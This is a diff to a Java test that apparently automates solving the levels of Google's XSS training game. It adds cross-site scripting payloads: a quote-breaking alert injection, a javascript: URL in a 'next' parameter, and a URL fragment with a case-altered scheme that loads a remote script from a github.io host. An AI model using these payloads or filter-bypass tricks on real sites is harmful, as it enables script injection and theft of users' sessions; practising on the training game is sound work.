@@ -18,7 +18,16 @@ public class XSSTest extends BaseTest {
             .goToThirdLevel()
             .inputScriptForThirdPage(getCheatSheetAlert())
             .acceptAlert()
-            .goToFourthLevel();
+            .goToFourthLevel()
+            .inputScriptForFourthPage("');alert('xss")
+            .acceptAlert()
+            .goToFifthLevel()
+            .inputScriptForFifthPage("/signup?next=javascript:alert(\"xss\");")
+            .acceptAlert()
+            .goToSixthhLevel()
+            .inputScriptForSixthPage("https://xss-game.appspot.com/level6/frame#htTps://mariaoskar.github.io/XSSTest/alert.js")
+            .acceptAlert()
+            .goToDone();
 
     }
 
